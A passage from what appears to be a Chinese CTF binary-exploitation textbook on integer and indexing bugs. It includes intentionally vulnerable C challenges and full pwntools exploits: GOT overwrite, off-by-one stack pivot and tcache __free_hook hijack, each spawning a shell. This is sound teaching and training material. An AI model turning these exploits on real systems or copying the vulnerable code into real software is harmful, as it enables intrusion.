        if (op == 2) { scanf("%ld %ld", &idx, &val); notes[idx] = val; }
        /* op==1：负下标 → 读任意 GOT 表项 → 泄露 libc
           op==2：负下标 → 写任意 GOT 表项 → 劫持函数        */
    }
}
```

exp 关键步骤（完整例题见 9.9 例题 3）：

```python
notes = elf.sym['notes']
# ① 负下标读：idx 是负数（puts@got 在 notes 下方）
idx = (elf.got['puts'] - notes) // 8        # 例：-42
leak = read_at(idx)                          # 读出 puts 的真实地址
libc.address = leak - libc.sym['puts']
# ② 负下标写：把同一位置写成 system
write_at(idx, libc.sym['system'])
# ③ 程序下一次调用 puts(受控字符串) 就变成 system("/bin/sh")
```

**利用条件**：无 PIE（或已破 PIE 知道数组地址）、Partial RELRO（GOT 可写；Full RELRO 时改打 `__malloc_hook`/栈/其他指针）、下界未检查。
**32 位注意**：GOT 表项 4 字节，int 数组正好一换一；若 64 位程序只有 int 数组，一个 8 字节地址要拆成低/高两个 4 字节写（写高 4 字节时小心别把相邻表项写坏——先算清对齐）。

### 9.5.3 类型混淆导致偏移错位

```c
/* 坑 A：想清零却按更宽的类型写 */
char buf[0x20];
int *arr = (int *)buf;
for (int i = 0; i < 0x20; i++)    // 循环次数照搬字节数
    arr[i] = 0;                    // 每次写 4 字节 → 实际清了 0x80 字节 → 越界 0x60！

/* 坑 B：循环变量用小类型 → 自然回绕成负数 */
char i;
int data[200];
for (i = 0; i < 200; i++)          // char 最大 127，再 ++ 变 -128
    data[i] = 0;                   // i 从 127 跳到 -128：data[-128] 位置被写！
```

审计口诀：**看循环变量的类型，而不只是循环边界**；`char i` 配上界 ≥ 128 的循环几乎是送分题。

### 9.5.4 指针数组 + 越界改函数指针

经典布局：`.bss` 里"数据指针数组"与"函数指针表"相邻：

```c
typedef void (*handler_t)();
handler_t handlers[8];                 // .bss：函数指针表
long     notes[16];                    // .bss：紧随其后（链接顺序需逆向确认）
```

程序提供 `edit_note(idx, val)` 且 idx 无下界检查（或只查上界）：

```python
# 逆向确认 handlers 与 notes 的相对位置后：
handlers_addr = 0x4040a0               # IDA 里直接看
k             = 2                      # 菜单触发 handlers[2]()
target_idx    = (handlers_addr + 8*k - notes_addr) // 8    # 通常为负
write_at(target_idx, backdoor)         # 把 handlers[2] 改成后门
choose(2)                              # 触发 → backdoor()
```

```text
notes[-N] … notes[-1] │ notes[0] … notes[15]
   ▲                     ▲
   │                     └─ 程序以为自己在操作 note
   └─ 实际落在 handlers[0..7]：改函数指针 = 改控制流
```

**变体**：越界写的是相邻的**长度字段**（先改大自己的长度，再正常溢出——整数漏洞与越界索引互相成全）；
`menu` 的 `switch(choice)` 越界读跳转表（`jump table` 在 .rodata，读出垃圾地址 call → 崩，但配合可控数据可定向）。

---

## 9.6 漏洞模式五：未初始化变量

### 9.6.1 栈残留数据泄露（"预热"栈）

未初始化的局部缓冲区里躺着的，是**上一个函数离开时没擦掉的栈内容**——可能是 libc 指针、栈指针，甚至我们自己的数据：

```c
void leak() {
    char buf[0x40];              // 未初始化
    printf("leak: ");
    write(1, buf, 0x40);         // 把栈残留原样倒出来
}
```

预热套路：

```text
第 1 步（预热）：调用一个会把"想要的值"留在该栈区域的函数
        ├─ 想要 libc 指针：调用 puts/printf 等深层 libc 函数，
        │   其内部调用链会在栈上留下 main_arena/返回地址等 libc 值
        ├─ 想要栈地址：寻找保存了 esp/rbp 的路径
        └─ 想要可控数据：调用"录入名字"之类的输入函数（同栈深度写入）
第 2 步（收割）：触发 leak() → 打印 0x40 字节残留 → 扫描指针形状（0x7f…）
```

```python
# exp 思路模板（假设菜单 4 可触发一次深层 printf，菜单 3 是未初始化泄露）
menu(4, b'%99999c')              # ① 预热：深层 printf 把 libc 值压进栈
menu(3, b'')                     # ② 收割：leak() 打印同一片栈
data = io.recv(0x40)
for off in range(0, 0x40, 8):
    v = u64(data[off:off+8].ljust(8, b'\x00'))
    if 0x7f0000000000 < v < 0x800000000000:
        log.info('+%#04x → %#x', off, v)   # 与 libc 已知偏移比对定基址
```

**利用条件**：泄露函数与预热函数的栈帧**深度/位置重叠**（同一调用深度、相近帧大小）；
**常见坑**：两函数帧大小不同 → 残留错位 → 扫描时按 8 字节滑窗找，而不是死认某个偏移；
开启 `-ftrivial-auto-var-init=zero`（新版编译器选项）的程序栈会被清零，此法失效。

### 9.6.2 bss / 堆上未初始化字段当指针用

```c
struct box { int len; char *p; } boxes[16];    // .bss：初始全 0

void create(int i) {
    boxes[i].p = malloc(0x88);
    read(0, boxes[i].p, 0x88);
    boxes[i].len = 0x88;        // ★ 若某条路径（如异常分支）跳过这行……
}
void edit(int i) {
    if (!boxes[i].p) return;
    read(0, boxes[i].p, boxes[i].len);   // len 未初始化=0 时读 0 字节（无害）
}                                         // 但若 len 残留了旧值 → 越界写！
```

两类典型打法：

1. **bss 残留 = 别的功能写过的数据**：程序先做过 A 功能（在某 .bss 区域写过指针/长度），后做 B 功能却不初始化同一区域 → B 直接把 A 的残留当指针/长度用 → 等价于一次"借来的任意读写"；
2. **free 后指针未置空 + 重建未初始化**：`del()` 只 free 不清指针，`create()` 复用槽位时忘了重新赋值 → 悬挂指针复活（本质是 UAF，见第 10 章）。

```text
打 bss 未初始化的通用思路：
   找到"未初始化读取点"（打印 / 当指针解引用）
        ↓ 反向找"谁能往同一片内存留值"（其他功能的缓冲区、free 掉的堆块、上一轮循环）
        ↓ 用它预热 → 收割（泄露）或借指针（劫持）
```

**exp 思路示例**（结构体字段复活）：

```python
# create(0) → del(0)（指针未置空）→ 某功能把堆块送进 unsorted（fd=main_arena+96）
# → create(1) 未初始化 p 却复用了同一 .bss 槽位 → show(1) 直接打印 fd → libc 泄露
```

---

## 9.7 有符号性细节坑

### 9.7.1 char 的符号：x86 是 signed，ARM 是 unsigned

```c
char c = getchar();        // 输入 0x80 ~ 0xFF 的字节
if (c == 0xFF)             // x86：c 提升为 -1，0xFF 是 255 → 永假！
    puts("hit");
/* x86-64 与 Windows 默认 char = signed char；
   ARM / PowerPC 默认 char = unsigned char。
   同一份代码跨平台符号性不同 → 本地（x86）复现不了远端（ARM 路由器）的行为！ */
```

逆向视角：看到 `movsx eax, al`（符号扩展）→ 该 `char` 按 signed 用；`movzx` → 按 unsigned 用。

### 9.7.2 usual arithmetic conversions 速查表

双目运算/比较时，两侧操作数先统一到"共同类型"再计算。速查（LP64，即 Linux x64）：

| 操作数 A | 操作数 B | 统一成的类型 | CTF 含义 |
|:---|:---|:---|:---|
| int | unsigned int | unsigned int | **负 int 回绕成巨大正数（头号漏洞源）** |
| int | long / size_t | long（64 位有符号）| int 符号扩展成 `0xFFFF…FF` |
| unsigned int | long | long | long 装得下全部 unsigned int → 相对安全 |
| long | unsigned long | unsigned long | 负 long 回绕 |
| char / short（任一符号性）| ≥ int 的类型 | 先提升为 int | 小类型带着自己的符号上去 |
| int | 字面量 `0x100`（int）| int | **保留符号 → 负数通过检查** |
| int | `sizeof(...)`（size_t）| size_t | 负数变巨大 → 比较方向反转 |

最重要的两条对照（背下来）：

```c
int len = -1;
if (len <= 0x100)        /* int vs int → 有符号 → 负数通过 ★危险 */
if (len < sizeof(buf))   /* int vs size_t → 负数变巨大 → 条件为假 → 反而被挡住 */
```

所以：**与"字面量"比较看符号，与 sizeof/strlen 比较进无符号世界**——同一行检查换个右值，安全性天差地别。

### 9.7.3 sizeof / strlen 与无符号减法

```c
/* 坑 1：strlen 返回 size_t，空串减 1 → SIZE_MAX */
if (strlen(s) - 1 < 0x100)      /* 0-1 = 0xFFFFFFFFFFFFFFFF，永不 < 0x100 → 判断失灵 */
read(0, buf, strlen(s) - 1);    /* s 为空 → 读 2^64-1 字节 → 负长度漏洞复活 */

/* 坑 2：size_t 循环变量倒着数 */
for (size_t i = len - 1; i >= 0; i--)   /* i >= 0 恒真 → 一路越界到崩 */

/* 坑 3：unsigned 借位 */
unsigned int n = 0;
if (n - 1 > 0x100)              /* 0-1 = 0xFFFFFFFF > 0x100 → "防御"恒真 */
    memcpy(buf, src, n - 1);    /* 却把 SIZE_MAX 当长度传下去 → 崩/溢出 */

/* 坑 4：sizeof 的返回值直接参与长度 */
char buf[16];
read(0, buf, sizeof(buf) - 1);  /* 正确写法（留 '\0'），对照：sizeof(buf)+1 就是 off-by-one */
```

---

## 9.8 综合利用

### 9.8.1 整数溢出 × 堆

整数漏洞在堆题里几乎总是扮演"**打开缺口**"的角色，三个高频组合：

**组合 1：绕过 chunk 计数上限**

```c
char count = 0;                    // 只有 255 的容量
if (++count >= 10) { puts("full"); return; }
/* 连续分配 246 次后 count 回绕 → 上限失效 → 无限分配/无限 free
   → 攒够 tcache 全 7 格 + unsorted，为后续攻击备料 */
```

**组合 2：控制 malloc 大小进不同 bin**

```c
unsigned short size = read_short();      // 16 位
if (size < 0x20 || size > 0x50) die();
void *p = malloc((size & 0xF) * 0x10);   /* 检查 16 位，分配只用低 4 位
   → 输入 0x40 检查通过，实际 malloc(0)；
   → 但 free 时若用另一个字段重新算 size → size 与 chunk 实际不符
   → tcache 索引与 chunk 大小错位 → tcache stashing / 大小混淆类攻击面 */
```

**组合 3：本章例题 4 的"分配小、写入大"**

`malloc(乘法回绕后的小值)` + `read(原始大值)` → 一发堆溢出覆盖相邻 chunk 头 → tcache fd 劫持 → 任意地址分配。
这正是第 10 章大多数堆利用（poison、overlap、house of 系列）想要的起点：**整数漏洞负责"越界"，堆技巧负责"越界之后"**。

**附：malloc(neg) 的NULL陷阱**——`malloc(-1)` 返回 NULL，若程序不判空就把 NULL 存进指针表，
后续 edit/show 全部变成对 0 地址的读写；32 位老题可以 `mmap` 0 页接管，64 位下通常只能当作"让程序死得明白"的侦查手段。

### 9.8.2 整数溢出 × 格式化字符串

**组合 1：长度检查绕过 → 把 `%n` 系列格式串送进去**

```c
char fmt[0x100];
int len = get_len();            // 负数绕过（9.2 的全部手法都适用）
read(0, fmt, len);
printf(fmt);                     // ← 格式串漏洞被整数漏洞"解锁"
```

```python
# 经典串联：整数溢出打开注入面 → fmt 完成 32 位两段写
io.sendlineafter(b'len?', b'-1')
io.send(flat({0: b'%2216c%14$hn'}))    # 例：两段 %hn 改写 GOT（完整模板见 08 章）
```

**组合 2：fmt 反哺整数题——泄露栈地址解决 off-by-one 的 L0 问题**

9.4.3 的栈迁移依赖"低 12 位固定"，远程需要爆破；如果题目同时给了 fmt，直接把栈地址读出来：

```python
io.sendlineafter(b'>> ', b'1%15$p')      # 假设 %15$ 恰好是 saved rbp 残留
saved_rbp = int(io.recvuntil(b'\n', drop=True).split(b'1')[-1], 16)
X = (saved_rbp - 0x28) & 0xff            # 精确算出 off-by-one 该写的低字节，无需爆破
```

**组合 3：宽度字段本身是整数**

`%*d` 的 `*` 从参数取宽度，负宽度会回绕；`%.2000000000d` 这种超长宽度会让 printf 慢到超时，
也是把"已打印计数器"一次性顶到目标值的合法手段（配 `%hhn` 时计数天然 mod 256，无需担心 32 位溢出）。

---

## 9.9 典型例题

### 例题 1：负长度绕过 read 检查导致栈溢出（ret2text）

**题目原型（伪 C）**：

```c
// pwn1.c : gcc pwn1.c -o pwn1 -no-pie -fno-stack-protector
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void backdoor() {                 // 0x401176（示例地址，以实际为准）
    system("/bin/sh");
}

int main() {
    char buf[0x40];
    int len;
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("length? ");
    scanf("%d", &len);            // 攻击者完全控制 len（有符号 int）
    if (len > 0x40) {             // 有符号比较：-1 也算"合法"
        puts("too long!");
        exit(1);
    }
    read(0, buf, len);            // 第 3 参是 size_t：-1 符号扩展成"无限"
    return 0;                     // ← 返回地址已在我们脚下
}
```

**checksec**：

```text
$ checksec pwn1
[*] '/home/ctf/pwn1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found        ← 无 canary，栈可打穿
    NX:       NX enabled             ← 不能塞 shellcode，走 ROP/后门
    PIE:      PIE disabled           ← backdoor 地址固定
```

**漏洞定位**：

- 静态：IDA 中 `call read` 之前 `movsxd rdx, eax`（int → size_t 符号扩展），而长度检查是 `cmp eax, 0x40; jle`（有符号）——9.3.4 的标准搭配；
- 动态：先发 `100` 被拒（too long），再发 `-1` 通过 → 确认负数路径；
- 偏移：`cyclic 200` 喂进去 → `cyclic -l <崩溃值>` 得填充量 `0x48`。

**利用思路**：`len = -1` → `read` 无边界 → 栈溢出 → 补一个 `ret` 对齐 → 跳 `backdoor`。

**完整 exp**：

```python
from pwn import *
context(arch='amd64', log_level='info')

elf = ELF('./pwn1')
io  = process('./pwn1')

backdoor = elf.sym['backdoor']             # system("/bin/sh") 后门
ret      = next(elf.search(asm('ret')))    # 裸 ret，栈对齐防 movaps 崩

io.sendlineafter(b'length?', b'-1')        # ① 负数通过有符号检查
                                           #    注意先发 -1 再单独发溢出数据，
                                           #    防 scanf 的 stdio 缓冲吞掉 payload
payload  = b'a' * 0x48                     # ② buf(0x40) + saved rbp(8) 填到返回地址
payload += p64(ret)                        #    16 字节对齐
payload += p64(backdoor)                   # ③ 返回地址 → backdoor
io.send(payload)                            #    read 收到多少算多少

io.interactive()
```

**变体**：无后门时按 9.2.2 模板两轮 ret2libc；32 位时长度用 `p32(-1)` 或直接发字符串 `-1`；
若长度通过 `recv` 的 4 字节定长字段读入 → `io.send(p32(0xffffffff))`。

**常见坑**：`sendlineafter` 的换行若被 `read` 路径吃到会占 1 字节溢出预算（本题走 scanf 无碍）；
偏移 0x48 必须现场用 cyclic 确认，不同编译器给 `len` 留的位置会改变 buf 的对齐。

---

### 例题 2：off-by-one 覆盖 ebp 低字节做栈迁移 getshell

**题目原型（伪 C）**：

```c
// pwn2.c : gcc pwn2.c -o pwn2 -no-pie -fno-stack-protector
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void backdoor() { system("/bin/sh"); }

void vuln() {
    char buf[0x20];
    puts("hello");
    read(0, buf, 0x21);           // ← off-by-one：0x20 的杯子倒 0x21
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;                     // main 的 leave;ret 是栈迁移的"发动机"
}
```

**checksec**：

```text
[*] 'pwn2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found        ← 有 canary 此路必死（那 1 字节落在 canary 上）
    NX:       NX enabled
    PIE:      PIE disabled
```

**漏洞定位**：gdb 在 `read` 返回后断下：`buf = rbp-0x20`，写满 0x20 后第 0x21 字节正好落在 `[rbp]`（saved rbp）的最低字节。逆向确认 main 结尾是 `leave; ret`（-O0 默认）。

**利用思路**：改 saved rbp 低 1 字节 → vuln 正常返回后 rbp 寄存器已是假值 → main 的 `leave;ret` 把 esp 搬进我们的 buf → 在 buf 内布置伪帧直接上 backdoor。栈图与机制推导见 9.4.3。

**完整 exp**：

```python
from pwn import *
context(arch='amd64', log_level='info')
elf = ELF('./pwn2')
io  = process('./pwn2')

# —— gdb 实测（本地）：read() 断下时 saved rbp = 0x7ffd?????2a0
#    同一环境下栈地址低 12 位恒定 → 低字节 L0 = 0xa0
L0 = 0xa0                        # 原 saved rbp 的最低字节
X  = (L0 - 0x28) & 0xff          # 新 rbp = buf + 8 = 原rbp - 0x28（落进我们的 buf）

backdoor = elf.sym['backdoor']

payload  = p64(0)                # buf+0x00：占位（迁移后不再使用）
payload += p64(0)                # buf+0x08：main 的 leave 先 pop 这里进 rbp
payload += p64(backdoor)         # buf+0x10：随后 ret 取这里 → backdoor
payload += p64(backdoor)         # buf+0x18：备用分支（rbp' 若落在 buf+0x10 也能接住）
payload += bytes([X])            # buf+0x20：off-by-one 的 1 字节 → 改 rbp 低位
assert len(payload) == 0x21

io.sendafter(b'hello\n', payload)
io.interactive()
```

**变体**：off-by-two（低 2 字节可改，活动半径 64KB）；32 位同理；buf 与 saved rbp 之间有 padding 时此路不通，改用"泄露栈地址 + 正常溢出"。

**常见坑**：

- 本地通远程不通 → 远端 env 长度不同导致 L0 变了：按 9.4.3 的 16 选 1 爆破，或先用其他泄露拿栈地址；
- `X` 计算后忘 `& 0xff`；payload 长度不是恰好 0x21（多 1 字节会挤掉 saved rbp 的第 2 低字节）；
- main 被优化成 `add rsp,N; ret` 结尾（-O2）→ 没有 `leave`，迁移发动机熄火 → 换思路。

---

### 例题 3：负索引越界读写 GOT

**题目原型（伪 C）**：

```c
// pwn3.c : gcc pwn3.c -o pwn3 -no-pie -fno-stack-protector
#include <stdio.h>
#include <unistd.h>

long notes[16];                    // .bss 里的 long 数组（元素 8 字节）
char name[0x20];                   // .bss，main 开头读一次

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("name: ");
    read(0, name, 0x18);           // 退出时会 puts(name) → 留作劫持跳板
    while (1) {
        long op, idx, val;
        printf(">> ");
        if (scanf("%ld", &op) != 1) return 0;
        if (op == 0) break;
        if (op == 1) {                              // 读
            printf("idx: ");
            scanf("%ld", &idx);
            printf("val = %#lx\n", notes[idx]);     // ★ 无下界检查：负下标读 GOT
        } else if (op == 2) {                        // 写
            printf("idx: ");
            scanf("%ld", &idx);
            printf("val: ");
            scanf("%ld", &val);
            notes[idx] = val;                        // ★ 无下界检查：负下标写 GOT
        }
    }
    printf("bye, ");
    puts(name);                    // 退出路径：puts(name)
    return 0;
}
```

**checksec**：

```text
[*] 'pwn3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO          ← GOT 可写（Full RELRO 则需换目标）
    Stack:    Canary found           ← 不影响：全程不碰栈
    NX:       NX enabled
    PIE:      PIE disabled           ← notes 与 GOT 地址固定
```

**漏洞定位**：`scanf("%ld", &idx)` 后直接 `notes[idx]`，没有任何 `idx >= 0` 检查；
IDA 中对应 `mov rax, [r12+rax*8]` 且 rax 未经检验——负数下标即任意相对读写。

**利用思路**：`.got.plt` 在 `.bss` 下方 → 负下标读 `puts@got` 泄露 libc → 负下标写 `puts@got = system` → 退出时 `puts(name)` 变成 `system("/bin/sh")`。

```text
低地址 ──▶ 高地址
 .text │ .rodata │ .got.plt(puts@got ←目标) │ .data │ .bss( notes[] , name )
                              ◀──── idx = (puts@got - notes)/8 （负数）────
```

**完整 exp**：

```python
from pwn import *
context(arch='amd64', log_level='info')

elf  = ELF('./pwn3')
libc = ELF('./libc-2.31.so')
io   = process('./pwn3')

notes = elf.sym['notes']           # .bss 数组基址（no-PIE，固定）

io.sendafter(b'name: ', b'/bin/sh\x00')       # name 提前埋好 "/bin/sh"

def read_at(idx):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.recvuntil(b'val = ')
    return int(io.recvline().strip(), 16)

def write_at(idx, val):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendlineafter(b'val: ', str(val).encode())

# ① 负下标读 GOT → libc 基址
puts_idx = (elf.got['puts'] - notes) // 8     # 负数（GOT 在 .bss 下方）
assert (elf.got['puts'] - notes) % 8 == 0     # 8 字节对齐必须整除，否则改拆半字访问
leak = read_at(puts_idx)
libc.address = leak - libc.sym['puts']
log.success('libc base = %#x', libc.address)

# ② 负下标写 GOT：puts@got → system
write_at(puts_idx, libc.sym['system'])

# ③ op=0 退出 → puts(name) → system("/bin/sh")
io.sendlineafter(b'>> ', b'0')
io.interactive()
```

**变体**：64 位程序只有 int 数组时，把 8 字节地址拆成低/高两个 4 字节写（写高 4 字节前先确认相邻表项不会被写坏）；下界检查了但上界过松（`idx < 0x7fffffff`）→ 正向大下标摸 .data/堆；与 9.5.4 的函数指针表组合（改 `handlers[k]` 后触发菜单）。

**常见坑**：Full RELRO 下 GOT 只读，硬写 GOT 直接段错误 → 改打 `__malloc_hook`（2.34 前）或返回地址；`(got - notes) % 8 != 0` 时整除取的 idx 会错位——用 `//` 后必须 assert 余数；读出来的值若像 `0x00007f...` 高位为 0，记得 `ljust`/按 `#%#lx` 原样解析。

---

### 例题 4：malloc 乘法溢出堆溢出题（tcache 劫持 __free_hook）

**题目原型（伪 C）**：

```c
// pwn4.c : gcc pwn4.c -o pwn4 -fno-stack-protector   （glibc 2.31，附 libc-2.31.so）
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

struct box { unsigned int n; char *p; } boxes[16];
int cnt = 0;

void create() {
    if (cnt >= 16) { puts("full"); return; }
    unsigned int n;
    printf("size: ");    scanf("%u", &n);
    unsigned int total = n * 8;               // ★ 32 位乘法：0x20000000*8 = 0（回绕）
    if (total > 0x1000) { puts("too big"); return; }   // 检查的是回绕后的小值
    char *p = malloc(total);                  // 分配的也是小值：malloc(0)
    if (!p) { puts("no mem"); return; }
    printf("content: ");
    read(0, p, n);                            // ★ 使用的却是原始 n → 分配小、写入大！
    boxes[cnt].n = n; boxes[cnt].p = p; cnt++;
}
void edit() {
    unsigned int i; printf("idx: "); scanf("%u", &i);
    if (i >= 16 || !boxes[i].p) return;
    read(0, boxes[i].p, boxes[i].n);          // 同样用原始 n
}
void show() {
    unsigned int i; printf("idx: "); scanf("%u", &i);
    if (i >= 16 || !boxes[i].p) return;
    write(1, boxes[i].p, boxes[i].n);
}
void del() {
    unsigned int i; printf("idx: "); scanf("%u", &i);
    if (i >= 16 || !boxes[i].p) return;
    free(boxes[i].p);                         // ★ 不置空（本题需要 show-after-free）
}
int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    while (1) {
        puts("1.create 2.edit 3.show 4.del 5.exit");
        printf("choice: ");
        int op; scanf("%d", &op);
        if (op == 1) create();
        else if (op == 2) edit();
        else if (op == 3) show();
        else if (op == 4) del();
        else return 0;
    }
}
```

**checksec**：

```text
[*] 'pwn4'
    Arch:     amd64-64-little
    RELRO:    Full RELRO            ← GOT 只读：所以去劫持 __free_hook
    Stack:    Canary found          ← 不影响：全程在堆上
    NX:       NX enabled
    PIE:      PIE disabled
    环境：    glibc 2.31（题目附 libc-2.31.so，无 safe-linking）
```

**漏洞定位**：`create()` 中乘法 `n * 8` 与检查/分配同用回绕后的 total，但 `read` 用原始 n——
"分配小、写入大"；`edit()` 同病（用存储的原始 n）。动态验证：输入 `n = 0x20000000` 创建后，edit 该槽可以写出远超 chunk 的字节数。

**堆布局设计**（H = box0 的 chunk 头；首个 tcache 结构体 chunk 0x290 在更下方，不影响相对偏移）：

```text
box0 0x20      box1 0x90      box2 0x90      box3(L) 0x420    box4 0x90(挡板)
[H] ──────────[H+0x20]──────[H+0xb0]──────[H+0x140]────────[H+0x560]──── top
                ▲ payload 从 box0 数据区 (H+0x10) 出发：
   +0x10  box1.prev_size        +0x18  box1.size = 0x91     （保持合法）
   +0x20  box1.fd  ← 改成 __free_hook   +0x28  box1.key
   +0xa0  box2.prev_size        +0xa8  box2.size = 0x91     （保持合法）
   +0x130 box3.prev_size        +0x138 box3.size = 0x421    （保持合法）
```

**利用思路**：

1. `n = 0x20000000` → `malloc(0)` 得 0x20 小 chunk（溢出源，其"名义写长"巨大）；
2. 两个 0x90 chunk 先后 free 进 tcache（链头 box1 → box2，计数 2）；
3. 一个 0x420 chunk free 进 unsorted（box4 挡住 top 不被合并）→ show 泄露 libc；
4. 从 box0 溢出：只改 tcache 链头 box1 的 fd = `__free_hook`（其余元数据原样保持）；
5. 连续两次 create → 第二次直接拿到 `__free_hook` 当 chunk → 写入 system；
6. free 一个内容为 "/bin/sh" 的指针 → `__free_hook` 触发 `system("/bin/sh")`。

**完整 exp**：

```python
from pwn import *
context(arch='amd64', log_level='info')

elf  = ELF('./pwn4')
libc = ELF('./libc-2.31.so')
io   = process('./pwn4')

def menu(choice):
    io.sendlineafter(b'choice:', str(choice).encode())

def create(n, content):
    menu(1)
    io.sendlineafter(b'size:', str(n).encode())
    io.sendafter(b'content:', content)        # read(0, p, n)：发多少收多少

def edit(idx, content):
    menu(2)
    io.sendlineafter(b'idx:', str(idx).encode())
    io.send(content)                           # read(0, p, boxes[idx].n)

def show(idx):
    menu(3)
    io.sendlineafter(b'idx:', str(idx).encode())

def delete(idx):
    menu(4)
    io.sendlineafter(b'idx:', str(idx).encode())

BIG = 0x20000000                  # BIG*8 = 0x1_0000_0000 → 32 位截断为 0

create(BIG, b'pad\n')             # box0: malloc(0)    → 0x20 chunk（溢出源）
create(0x11, b'a'*0x11)           # box1: malloc(0x88) → 0x90 chunk
create(0x11, b'b'*0x11)           # box2: 0x90 chunk
create(0x82, b'c'*0x82)           # box3: malloc(0x410)→ 0x420 chunk（泄露用）
create(0x11, b'd'*0x11)           # box4: 0x90 chunk（挡板，防 top 合并）

delete(2); delete(1)              # tcache[0x90]: box1 → box2，计数 2
delete(3)                         # 0x420 → unsorted（box4 在上方挡住 top）

show(3)                           # free 后 fd = main_arena + 96 → libc 泄露
leak = u64(io.recv(8))
main_arena = libc.sym['__malloc_hook'] + 0x10     # 2.31 的经验偏移
libc.address = leak - (main_arena + 96)
log.success('libc base = %#x', libc.address)
free_hook = libc.sym['__free_hook']
system    = libc.sym['system']

# 从 box0 溢出：改 tcache 链头 box1 的 fd，其余堆元数据原样保留
payload  = b'\x00' * 0x10                    # box0 数据区（0x18 可用，只垫 0x10）
payload += p64(0)                            # box1 chunk 的 prev_size（随意）
payload += p64(0x91)                         # box1 的 size：0x90 | PREV_INUSE，保持合法
payload += p64(free_hook)                    # ★ box1 的 fd（tcache 链头）→ __free_hook
payload += p64(0)                            # box1 的 key
payload  = payload.ljust(0xa0, b'\x00')      # 垫到 box2 的 chunk 头
payload += p64(0)                            # box2 prev_size
payload += p64(0x91)                         # box2 size（保持合法）
payload  = payload.ljust(0x130, b'\x00')     # 垫到 box3(L) 的 chunk 头
payload += p64(0)                            # L prev_size
payload += p64(0x421)                        # L size（保持合法，unsorted 完好）
assert len(payload) == 0x140
edit(0, payload)                              # 名义可写 0x20000000 字节，实际发 0x140

create(0x11, b'/bin/sh\x00')                  # 第 1 次 pop：拿到 box1，内容 "/bin/sh"
create(0x11, p64(system))                     # 第 2 次 pop：直接拿到 __free_hook，写 system
                                              # （tcache_get 会向 hook+8 写 0，2.31 实测无害）
delete(5)                                     # free("/bin/sh") → __free_hook → system("/bin/sh")
io.interactive()
```

**变体**：

- glibc ≥ 2.32：tcache/fastbin fd 启用 safe-linking（`fd = (chunk>>12) ^ target`）→ 需先泄露堆地址再异或加密；
- glibc ≥ 2.34：`__free_hook`/`__malloc_hook` 被移除 → 改打 `_IO_2_1_stdout_` 的 FSOP / house of apple / exit handlers（见第 10 章）；
- 溢出目标换成相邻 chunk 的 size（造 overlap）再走常规堆流程。

**常见坑**：

- 忘记 box4 挡板 → free(L) 直接并入 top → unsorted 里没东西，泄露失败；
- 溢出时把 box1/box2 的 size 字段写成垃圾 → 后续 free/检查崩在 `malloc(): invalid size`；
- 2.32+ 忘做 safe-linking 异或 → 链表指飞；show 泄露时 `recv(8)` 前先确认没有把提示符混进流；
- `scanf("%u")` 与 `read(0,...)` 混用 stdin：严格按提示符逐步交互（sendafter），防止 stdio 缓冲吞 payload。

---

## 9.10 代码审计要点清单

### 9.10.1 源码审计：必查函数组合

| 函数 | 必查点 |
|:---|:---|
| `read / recv / recvfrom / fread` | 长度来源及其类型；是否可被负数/截断影响；返回值是否检查（部分读） |
| `strcpy / strcat` | 完全无边界 → 直接对目的缓冲区大小，找谁控制源 |
| `strncpy / strncat` | n 的语义（"最多拷 n 字节"、可能不补 `\0`、可能多补 `\0`）；n 从哪来 |
| `memcpy / memmove / memset` | size 的算术来源：乘法？加法？截断？与检查值是否同一个表达式 |
| `malloc / realloc / alloca` | 大小算术（`count*size`、`size+1`）；`realloc(p,0)`≈free；alloca 在循环/负数下炸栈 |
| `calloc` | 自带乘法溢出检查——题目若"手工实现 calloc"多半是考点 |
| `snprintf` | 返回值是"本应写入的长度"（不含 `\0`）→ 二次拼接时用它当长度必溢出 |
| `atoi / strtol / scanf %d` | 负数、超长数字回绕 |
| 所有比较 | 左右类型：`int <= 0x100`（危险）vs `int < sizeof(buf)`（负数反被挡） |
| 循环 | `<=` 笔误；循环变量类型（`char i` 配上界 ≥128）；size_t 倒序 `i >= 0` 恒真 |
| 数组下标 | 只查上界不查下界；`(T-arr)%size == 0`；下标来自用户/网络的每一处 |
| 未初始化 | 条件分支跳过的赋值；`.bss` 复用的结构体字段；free 后未置空 |

### 9.10.2 逆向视角：IDA 里的危险信号

```asm
; 信号 1：有符号检查 + 符号扩展传参（= 例题 1 的翻版）
mov     eax, [rbp+len]
cmp     eax, 0x40
jle     short ok           ; jle/jl/jge/jg = 有符号比较 → 负数放行
...
ok:
movsxd  rdx, eax           ; ★ int → 64 位符号扩展：负数变 0xFFFF...FF
lea     rsi, [rbp+buf]
xor     edi, edi
call    read

; 信号 2：无符号检查（对照组，这类检查负数进不来）
mov     eax, [rbp+len]
cmp     eax, 0x40
jbe     short ok           ; jbe/ja/jae/jb = 无符号比较

; 信号 3：截断
mov     eax, [rbp+len]
movsx   eax, ax            ; / movzx / and eax, 0xff —— 检查与使用是否同侧

; 信号 4：乘法
imul    eax, [rbp+n], 8     ; 32 位乘法不查回绕（有 jo 说明作者防了，绕路走）
lea     rax, [rax*8]        ; lea 换算乘法同样不查
```

速记：**`jl/jle` 有符号、`jb/jbe` 无符号；`movsx/movsxd` 带符号扩展（该变量是 int），`movzx` 零扩展（unsigned）；`cdqe/cdq` 也是符号扩展**。call read/recv 前回溯 rdx（第 3 参）的赋值链，是找整数漏洞最快的一条路。

---

## 9.11 常见坑

1. **本地能溢出远程不能**：环境变量/argv 长度不同 → 栈基址页内偏移不同 → off-by-one pivot 的低字节 L0 算错 → 按 16 字节对齐爆破 16 选 1，或先泄露栈地址；同理 16 字节对齐差异会让 `system` 的 movaps 崩——补一个 `ret`。
2. **负数 payload 打包错误**：
